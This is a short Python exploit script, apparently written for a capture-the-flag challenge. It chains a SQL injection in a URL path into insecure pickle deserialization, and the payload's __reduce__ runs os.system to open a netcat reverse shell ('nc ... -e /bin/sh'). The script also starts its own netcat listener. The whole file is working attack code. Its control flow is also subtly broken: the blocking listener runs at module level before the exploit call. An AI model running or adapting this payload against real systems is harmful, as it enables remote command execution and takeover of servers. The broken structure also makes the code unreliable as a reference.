import sys
import base64
import pickle
import os
import requests
import time 

# Payload to be executed (nc reverse shell payload)
payload = "nc -v 127.0.0.1 1234 -e /bin/sh"

# Exploit class definition
class Exploit:

    # __reduce__ method for serialization and deserialization
    def __reduce__(self):
        return os.system, (payload,)

def exploit(url):
    # Create an instance of the Exploit class
    exploit_instance = Exploit()

    # Serialize the object using pickle and encode in base64
    serialized_payload = base64.b64encode(pickle.dumps(exploit_instance)).decode()

    # Construct the final URL by appending the serialized payload
    final_url = f"{url}/view/' UNION SELECT '{serialized_payload}"

    # Perform a GET request to the constructed URL
    response = requests.get(final_url)
    print("GET Request Response:")
    print(response.text)

if __name__ == "__main__":
    # Example usage
    target_url = "http://127.0.0.1:1337"  # Replace with the actual target URL

print(f'[*]' ' Starting listener')
os.system("nc -lvnp 1234")

time.sleep(2)

print(f'[*]' ' Executing program: Pickle Rick..')
exploit(target_url)
